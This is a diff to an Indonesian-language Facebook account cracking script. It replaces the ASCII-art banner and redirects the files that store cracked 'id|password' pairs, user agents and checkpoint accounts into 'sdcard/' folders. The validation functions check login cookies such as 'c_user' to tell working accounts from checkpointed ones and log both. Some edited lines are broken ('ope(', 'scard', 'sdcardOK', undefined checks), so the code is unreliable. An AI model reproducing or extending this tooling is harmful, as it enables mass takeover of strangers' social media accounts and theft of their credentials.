@@ -457,73 +457,80 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	print('''\033[1;34m
-	🇰​​​​​🇦​​​​​🇼​​​​​🇦​​​​​🇮​​​​​🇮​​​​​
-          🇦​​​​​🇳​​​​​🇮​​​​​🇲​​​​​🇪​​​​​
-        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@@@@@@@@@@*****,&@@@@@@@@@@@@@@@@@@@@@@@@@**#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@@@@@@@@***********@@@@@@@@@@@@@@@@@@(***,****@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@@@@@@(***,*********%@@@@@@@@@@@@#*,,,,**/*****@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@@@@@****,,**////////*/((((((((******,./((////**@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@@@@*****,**//(((/%%%%%%%###%##/*/%######/((((/*&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@@@*,***,,//((%&&&&&&%/#&&&&&%%&&&&&&#&&%%%%%(//*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@@,*,***,,,(&&&&&&&&&&&&&&&&&&&&&&&&&&&(&&&%%%%#/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@@**,,,*,,,&&&&&&&&%&&&&&%&&&&&&&&&&@&@@@%%&@&&%###&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@@**//*****@&&&&&&&%&&&&%%%&&&&&&&&%&&&&%%&((&&&&%&#&(%@@@@@@@@@@&@&&&&&&&@@@@@@@@@@
-        @@@@@@@@////////@%&&&&&&#&#&&%&&&%###&&##########&(#&###(&%#%@@@&&%@@@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@@&/%/&&(/@%&@&@&&&&(&&&%%%%%###%&%##%###%####(#&&###%#(##@@@%&%@@@@@@@@@@@@@@@@@@@@@
-        @@@@@@&&&#&&&(@&%%&&&&&(#&&&&&#&&&%#%#&&#%&&%%%#%##(##&&&#/###(/&&/#&%@@@@@@@@@@@@@@@@@@@@
-        @@@@@%&&&&&&&(&%%&%%#%%((&&&&#(&&&&##%&%(&&&&&&&&###%#%&&&%%%%#(#@&&&&%@@@@@@@@@@@@@@@@@@@
-        @@@@&&&&&&&&&@&%%%%%##(((&&&%##%&&&##%%#&&&&&%&&&###@&%&#&&(%%%#,&(&&&%@@@@@@@@@@@@@@@@@@@
-        &&&&%&&&%&&&&@&%&%%%#(/((&&%%##&%%#(((##&&&&&#&%&##%%%%#(&#(%%%##((&&&#%&@@@@@@@@@@@@@@@@@
-        &&@@&&&&&&&&&&&&&&##%#(/#&#%%#(%###@%##(&&&&#%&&/%#@@@@&((%(%%%##*#&&&%#%&&&&&&&&&&&&&&&(%
-        @@@@&&&&&&&&&&&&&&&#&%%(#%&&&(%%#@@@&&#%&&&#%&%(%#@@@@@@@%%(%%%##/%&&&%%#####&&&&&@#%%%%%&
-        @@@@%&&&&&&&&&&&&&&%&&&(&( ..,,,.#@@#@#&&&(%%#%%&@&@%,,,,*#(%%###(#&&&%%%%%%&&%%#%%%%&&&&&
-        @@@@%&@&&&&&&(%&&&&&#&&((%**,**,**%@&@#&#&%&&@&@@@/&****%#&(%%##,(%&&&#%%%&&&@@&&&&&&&@@@@
-        @@@@@&&&&&&&&%&&&&&&#&&&%@,/(####/@@@@@@@@@@@@@@@@*(*#(*@@##&##%//#&&&(%%%&@@@@@@@@@@@@@@@
-        @@@@@%%%&#&&&&(#&&&&&#&&&&&#%%&&#@@@@@@@@@@@@@@@@@%&%&#@@@#&%%%#/(&&&&#%%&&@@@@@@@@@@@@@@@
-        @@@@@%#%%#&&&&#/&&&&%&#%&&%&&&&&&&&@@@@@@@@@@@@@@@@@@&&&&&&(%#(#*(##&&%%%&&@@@@@@@@@@@@@@@
-        @@@@@&%&%%(&&&&((&&&&#&%%&&%&&&&&&&@@@@@@@@@@@@@@@@@@&&&%%###(%#%((%&&&%%&&@@@@@@@@@@@@@@@
-        @&&&&&#&&&#%&&&&(&&&&&#&&&%#&&&&&@@@@@@@@@@@@@@@@@@@@@@@@(###&%(&(((#&&%%&&@@@@@@@@@@@@@@@
-        @&&&&&%&&&&&%&&&&(&&&&&##&&%@@@&@&@@@@@@@@@@@@@@@@@@@@@@@/#&&&#(&(((%/%(%%&&@@@@@@@@@@@@@@
-        &&&&&&&&%#&&(&&&&&%(%&&&&##(&@@@@@@@@@@@@@@%&%@@@@@@@@@/#/((&%(/&(((&&(%%%&&@@@@@@@@@@@@@@
-        @@@@@@@&&#&&&(&&&&&&/##&&&&%#&&%%@@@@@@@@@@@@@@@@@@@/(((#*(&&%/(&((/%&&(/%&&&@@@@@@@@((/@@
-        @@@@@@@#&&#&&(/&%@@&%//%&&&&&#&##/&&@@@@@@@@@@@@*((((((((,%&#(((/((//&&&#&#&&&@@@@@@@#((((
-        @@@@@@@#&&&/&((/&%%&&#/((%&&&#&%%&&%&%&&#%&%(((((((((((((%##/#%(((((#(&&&#%&#&&@@@@@@@((((
-        @@@@@@@%&&&(&(((/&%%%%#/#//%#&(%&%&%&&&&&%####((((((/(((#%/#&%&%%%/(/&%&&&%%%#&&@@@@@@@&##
-        @@@@@@@&&&&%/(((/*#%%%&%((#(#%&%#%&#&&&&&&&&&&&%%(%##/%(####%%%%%%%%%%&#&&&%%%%/&&&@@@@@@%
-        @@@@@@@%&&&#(/((/%%/&&&%%####@@&%&#%&&&&&&&&&&&&#@@@@@@&(###%%%%%%%((#&&####%%%%%(&&&&&&@&
-        @@@@@@@%&&&##//%*%%%/&&&&%##%&@@@@@@@&&&&&&&&%@@@@@@@@@@&@@@%#%%%%#/(((%&##%(%&%%%%%%%%%@@
-        @@@@@@&#&&#%%%%%/%%%/(&&&&&##%%&@@@@@@@@@@@@@@@@@@@@@@@@@%%&#@&%%%/(%%%%&&%%#/#%%%%%##@@@@
-        @@@@@@&%#%%%%%/(*%%((#(&&&&&&%%#@@@@@@@@@@@@@@@@@@@@@@%%&@&&%&%@%(#%%%%%%#&&&&#%&%%%%@@@@@
-        @@@@@@&%&%%%%%/(&%%(/(((&#&&&&%%(@@@@@@@@(@@@@@@@#@&@&&@#%@@@@@#(&%%%%%%%#(&&&&%&#%%%@@@@@
-        @@@@@@%%%%%%%%%%%%%%%%(((&(&&&&&%#@@@@@@@&&@@@@%@@@@%*(%%##%%&@(@@@%(%%%%%%%&&&&&%&%%#@@@@
-        @@@@@&%#%%%%%%%%%%%%%%%%%&&(&&&&&#(@@@@@%@%&%&@&@@&&#&*#(%%@%@@@@@@&&(%%%%%%%&#&&&(&%&&&&#
-        @&@@@&&&(/%%%%%%%%#######((#(&&&&&#(&@@&@@@#&@@@@@@###@&@#&@@#%@@@@&%&%%%%%/%%%(&&&&(&#&&&
-        @@&&@%&&&%&%%*%%%%%%#(((((((((%&&&&#(@%@@@@%@#@@@@#%%@&&@@@#@&@#&@&&&&/%(%%%(##/(&&&&((&&&
-        @&%%&%#&&%%%%%%%%%(/(/*#%(((((#%&&&&%(@@@@@@@@@@&%@&#&@@&#(%@@@&(&&&%&(%%(%%%/%#/(%&&&&/(#
-        &%%%&%%%(/%%%%%%%%%%%%%%#(#%%((#&&&&%#(&@@@@@@@@@@@@@@@%%%%@@%&@#@&##%/%%%%#%%#%%/((&&&&*(
-        &&&&&%%&%((&%%%%%%%%%%%%%%%#/#%((&&&&###%@@@@@@@@@&%@@@%@&@@@#&@@%%@&@@/%%%%(%%%%%%((&&&&/
-        %&%%#%%%%#%%&#%%%%%%%%%%%%%%%%(%((&&&&#(##@@&@@@@@@&&&%(@&&&&&&@@@@&%%@@%%%%#(#%%%%%((&&&&
-        ###((#%%%%&(%%%(%%%%%%%%%%%%%%%#/((&&&&((((&&&%%@@@%@&&&@%@&@@&@@@@@@@@@&(@(%#/(#%#(/*(&*%
-        %&%&&(#%%%/%%%%%&%%%%%%%%%%%%%%(//*%&&&&(/(#%%%&#%&@@@&&@%@@@@@#&@@@@@@@@@&%(%&(##((/(*#%%
-        %%&&&&@/*(%%%%%%%%#%%##%%%%%%%%((#&/%&&&((((#&@%@@@@%@&&@%@@@@@@@@@@@@@@@@@%%&/%(@##(((%%%
-        %%(&%%%(%%%%%%%%%%%%%%%%(((#%#(((#/#((&&&(((((&@@@@@@@@&@#@@@@@@@@@@@@@@@@@@((%%####@/(%%%
-        &((//%//%*&&%%%%%%%%%%%%%%%(/((((/(%/#(&&&(((#%%@@@@@@@@@#&@@@@@@@@@@@@@@@@@@%(((%&/((@((#
-        %###((#%%%%%%%%%%%%%%%&%&%%%&%((/##(%(#%&&(#(#&&%#@@@@@@&&&@@@@@@@@@@@@@@@@@@&%%/(((/&/@((
-        (%(((#%%%%%%%%%%%%%%%%%%/&%&%##%(((#///(&&&###(%&&@@@@@@@@%@@@@@@@@@@@&@@@@@@@%%%%&((((/%/
-        %%%#((#%%%%%%%%%%%%%%%%&#((%%%%%&%((/((((&&(%(#(&&&@@@@@@@%&@@@@@@@@@@@%&@@@@@%%%###&(((/@
-        %&&&##(//(((((###%%%%%%%%#((%%%%&&%(//(((&&#%%##&&&&@@@@@%@%@@@@@@@@@@@@@%%@@@&%%%%###@@&@
-        %&&&&#%&&//((///(///((#%%%%%#%%%%%%/((//*#&&%%(##%%%@@@@@@&@@@@@@@@@@@@@@@%%%@@&&&&#@&&&@@
-        &&&&&&%&&#((//((((((((((#%%%%%%%%%%((((*((&&%%%##(%%%@@@@@@@@@@@@@@@@@@@@@@&&&%%/@@&@@@@@@
-       
-▒█░░▒█ ▒█░▒█ ░█▀▀█ ▒█▀▄▀█ ▒█▀▀▀ ▀▀█▀▀ ▒█▀▀▀ 　 
-▒█▄▄▄█ ▒█▀▀█ ▒█▄▄█ ▒█▒█▒█ ▒█▀▀▀ ░▒█░░ ▒█▀▀▀ 　 
-░░▒█░░ ▒█░▒█ ▒█░▒█ ▒█░░▒█ ▒█▄▄▄ ░▒█░░ ▒█▄▄▄ 　 
+                                 --:-+++++++=:--                                
+                             .:*+               =*:.                            
+                            #=                     -%.                          
+                          #.                         .#                         
+                        -+                            .=+                       
+                       =-                             ..:+                      
+                      +.                              -:::+                     
+                     = ..                             -:  -*                    
+                    -. .                               .   =*                   
+                   =:  =:                             :-   .**                  
+                  :=:  --                             :     :#-                 
+                  +-   :=                             :      *+.                
+                 #-     : .                           .     .+%*                
+                :..      .                           -      .+ --               
+                #%.      .                                  .: #+               
+               :-===                                        =+ :+-              
+               -::-.                                        -=  +=              
+               +# =+                                        -   +=              
+              .=. ..                                            :*.             
+              +=   +:                                            *#             
+              +-   .                                             +#             
+              :+   .:                  :                         =-             
+              :+     -                 -.                  -:    =.             
+              .=     =                 :.                  +.=   :.             
+              .+    :#        .:       .:         :        #:*:  -.             
+              :+   .++       . *       -=         =        +-*=  =.             
+              -+   =-*       ::-:      :--       ::-       *=:.  %=             
+              +*   --+   .    =-:      -::      :-=    .   ===   %#             
+              +#- :.=   :.=    ::.     -+-.    .=-   =:::   +-  .*#             
+              -+:. =.--#**:%:    := : ++@*+.  --    ---+%*=- +  =*=             
+               #=+-:.@@@@@@-%:     +=*#@@@@% +     . *#@@@@@:.- *%              
+               @%%: #*@@@@@@@%     #==@@@@@%:*    .#@@@@@@@%* .#@*              
+               -@*: .@@@@@@@@@%+=*=@=%#=:#*@@%=##+%@@@@@@@@@*  +@:              
+               -@%. *@@@@@@@@@@@%#@@@*-: -=*@@@#%@@@@@@@@@@@=  @@+              
+               .%@+ =@@@@@@@@@@@@@@@% =. :+ #@@@@@@@@@@@@@@@* +%%:              
+                @@@ -@@@@@@@@@@@@@@@:. #@% -.%@@@@@@@@@@@@@@+ @@@               
+                -@@..@@@@@@@@@@@@@@*:==@@@*-:.@@@@@@@@@@@@@@:.%@+               
+                .@@- @#@@@@@@@%@@@+:=:%@@@@+= :###@@@@@@@#@@ -@@-               
+                 @@- =#%#%##%#%@@*   .@@@@@-  :-#%##%#@#%*%= +@@                
+                 :* :.*%#%@##@%%+  .-@@@@@@@:   =#%%*@%%@** . ==                
+                 =.   =#%%#%@#*-:  :*@@@@@@@#- ---##@#@%%=     =                
+                :      =#*#%-.==+ -=@@@@@@@@@%  :++.:%+:        -               
+                *       =   :+=-   @@@@@%@@@@=#  +      +       =               
+               -       .          .+@@@@*@@@@.:          .     ..+              
+               ...          :.:.  ..@@@@:@@@@-:  . :        .-..::              
+                + =-:    -:: -=:  .*-*@% #@#+-- .=--  -.. -++= -=               
+                .-.#-.  ..+%:  =. .=*%%..-=@==  =-: :==*+.:*- *::               
+                  +++=    *%%-  %  =% # - @ *#     :%+#:+:  .:+.                
+                   ++.=@@@@%#-   : .#=     .*:    :#%#@@@@= :+                  
+                   .# @@@@@@@=      .:- .  ::.    ..@@@@%*%@*                   
+                   :+-=*#@@@@*:    .  - .  -.#     +@@@@:+#*:                   
+        :-------:  +-# ==%@@@@.    -  : .    - *   @%==*=-+#:             .:-:+*
+  %=+.*#:..:::...:*:=# %%%%%%@:   --  :      = - .-@+.:     .=#%%%%%%%%%%+:.:** 
+ #   #@##%@#@@@@@*@:.* - = :=*.. = :=:. + -=-=.*#:+*+-%-                 -%  %  
+-: .==@*@#%##%%%@*#:-- +  +%@*=-*%:*.#=.*:*%:*:@+***-.  :.=#+-.   .:=#*..   *   
+*:-:*=@*%#%#%#%##*#-:* #   :=-:.-#.: :. : ::.:.@+---@*-       ......=-     +    
+#.#=*=@@@@@@@@@@@@@=.+ %   .=+:-+*.- +. :  = -.#*=-=+=:         .-+*=.   --     
+#.#=*=@%%@%%@@@@%%%+:+ %  .+==+*#%+*:+: = .=:+-##+@@%*.    .::.++=+-:. .=.      
+*.+:+=@@@@%++@@@@@@+:= *  .      :=+- .- -.          .:-::      :+-.::-*        
++   +=@@@@@@@@@@@@%+.: =  :=.      .+=--::::        -++-        .:::#+          
++   -=@@@%@@@@#@@@%-.- #  :=         ..:.            ==.         =#:.           
+=:-. *@@@*@@@@*@@@@-.  %# .*.  ==*#=*%:-#-=@#:==.   .-+-     =++=:              
+.#%-==  .*-   ==   :. .@#*==-++   +:  .-@-.   *-:#+------=+**:                  
+ .##               -  ##=+-----.  .=   :+.   .*  -=*-*=+-@                      
+                   :  + =*+   :-#  .:  :+-   -+ .-*=@=--:                       
+                  *  :  *=:     : .          . -=.--:-.+#                       
+                  - .=  :*+         =:*-:-+-:  .      #*:                       
+                 ..:-    :+++.       =--=--=        =**-                        
+                  *:       *:*:                   :#-*.                         
+                             :*:                 :=:                            
+                               .%      .:       *:                              
+:......                          +.- +%--++  . =                                
+                                  :=#%%-:=%@@+-                                 
 
-▒█░▄▀ ▒█░▒█ ▒█░▒█ ▒█▀▀▄ ▒█░▒█ ▒█▀▀▀ ▒█▀▀▀█ ▒█░▒█ ░█▀▀█ ▀█▀ ▀█▀ 
-▒█▀▄░ ▒█▀▀█ ▒█░▒█ ▒█░▒█ ▒█▀▀█ ▒█▀▀▀ ░▀▀▀▄▄ ▒█▀▀█ ▒█▄▄█ ▒█░ ▒█░ 
-▒█░▒█ ▒█░▒█ ░▀▄▄▀ ▒█▄▄▀ ▒█░▒█ ▒█▄▄▄ ▒█▄▄▄█ ▒█░▒█ ▒█░▒█ ▄█▄ ▄█▄
             ''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login123():
@@ -1262,8 +1269,8 @@ def passwrd():
 	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
 	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
-	
-	def cektahun(fx):
+
+def cektahun(fx):
 	if len(fx)==15:
 		if fx[:10] in ['1000000000']       :tahunz = '2009'
 		elif fx[:9] in ['100000000']       :tahunz = '2009'
@@ -1322,7 +1329,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1331,7 +1338,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1344,7 +1351,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1354,7 +1361,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -1391,7 +1398,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1400,7 +1407,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1413,7 +1420,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1423,7 +1430,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1460,7 +1467,7 @@ def validate3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1469,12 +1476,12 @@ def validate3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				if 'no' in taplikasi:
+				if 'no' in cek_a:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
@@ -1482,9 +1489,9 @@ def validate3(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					ope('scard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
-				elif 'ya' in taplikasi:
+				elif 'ya' in cek_apk:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
@@ -1492,7 +1499,7 @@ def validate3(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcardOK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1549,7 +1556,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1558,7 +1565,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1571,7 +1578,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('scard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1581,7 +1588,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1637,7 +1644,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1646,7 +1653,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1659,7 +1666,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1669,7 +1676,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1725,7 +1732,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1734,7 +1741,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1747,7 +1754,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1757,7 +1764,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1814,7 +1821,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1823,7 +1830,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1836,7 +1843,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1846,7 +1853,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1903,7 +1910,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1912,7 +1919,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1925,7 +1932,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1935,7 +1942,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1973,7 +1980,7 @@ def colmek1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
